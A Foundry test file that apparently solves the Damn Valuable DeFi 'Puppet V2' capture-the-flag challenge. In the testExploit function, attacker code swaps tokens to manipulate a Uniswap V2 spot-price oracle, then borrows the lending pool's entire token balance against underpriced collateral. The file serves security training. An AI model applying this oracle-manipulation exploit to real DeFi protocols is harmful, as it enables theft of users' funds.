// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "test/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {WETH9} from "src/WETH9.sol";

import {PuppetV2Pool} from "src/puppet-v2/PuppetV2Pool.sol";
import {UniswapV2Library} from "src/puppet-v2/UniswapV2Library.sol";


import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "src/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {

    uint256 MAX_INT = 2**256 - 1;

    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    //Had to downgrade to september 6 ver of foundry to deploy uniswap (f5ca74b2d0d75c4e2f971da25abc591a8b00183c)
    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);

        assertEq(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        address[] memory path = new address[](2);
            path[0] = address(dvt);
            path[1] = address(weth);

        vm.startPrank(attacker);
        weth.approve(address(puppetV2Pool), MAX_INT);
        dvt.approve(address(uniswapV2Router), MAX_INT);

        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE - 1 ether}();

        uint256 amountOutMin = getAmountOut();

        uniswapV2Router.swapExactTokensForTokens(
            dvt.balanceOf(attacker),
            amountOutMin,
            path,
            attacker,
            block.timestamp + 1 hours
        );
        
        uint256 maxBorrow = dvt.balanceOf(address(puppetV2Pool));
        uint256 depositNeeded = puppetV2Pool.calculateDepositOfWETHRequired(maxBorrow);
        maxBorrow = weth.balanceOf(attacker) < depositNeeded ? maxBorrow * 
            weth.balanceOf(attacker) / depositNeeded : maxBorrow;

        console2.log("borrow amount %s", maxBorrow);
        console2.log("deposit needed %s", depositNeeded);
        console2.log("attacker weth balance %s", weth.balanceOf(attacker));

        puppetV2Pool.borrow(maxBorrow);

        amountOutMin = getAmountOut();

        uniswapV2Router.swapExactTokensForTokens(
            dvt.balanceOf(attacker),
            amountOutMin,
            path,
            attacker,
            block.timestamp + 1 hours
        );

        maxBorrow = dvt.balanceOf(address(puppetV2Pool));
        depositNeeded = puppetV2Pool.calculateDepositOfWETHRequired(maxBorrow);
        maxBorrow = weth.balanceOf(attacker) < depositNeeded ? maxBorrow * 
            weth.balanceOf(attacker) / depositNeeded : maxBorrow;

        console2.log("borrow amount %s", maxBorrow);
        console2.log("deposit needed %s", depositNeeded);
        console2.log("attacker weth balance %s", weth.balanceOf(attacker));

        puppetV2Pool.borrow(maxBorrow);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }

    function getAmountOut() internal returns (uint256) {
        (uint256 resWETH, uint256 resToken) = UniswapV2Library.getReserves(
            address(uniswapV2Factory), address(weth), address(dvt));
        uint256 amountOut = UniswapV2Library.getAmountOut(dvt.balanceOf(attacker),
            resToken, resWETH);
        return amountOut;
    }

    function getAmountIn() internal returns (uint256 amountIn) {
        uint256 deposit = weth.balanceOf(attacker);
        uint256 quote = deposit / 3;
        (uint256 resWETH, uint256 resToken) = UniswapV2Library.getReserves(
            address(uniswapV2Factory), address(weth), address(dvt)
        );
        uint256 amountIn = (quote * resWETH) / resToken;
        console2.log("[resWeth %s] [resToken %s]", resWETH, resToken);
        console2.log("[deposit %s] [quote %s] [amountIn %s]", 
            deposit, quote, amountIn);
        return amountIn;
    }

    
}
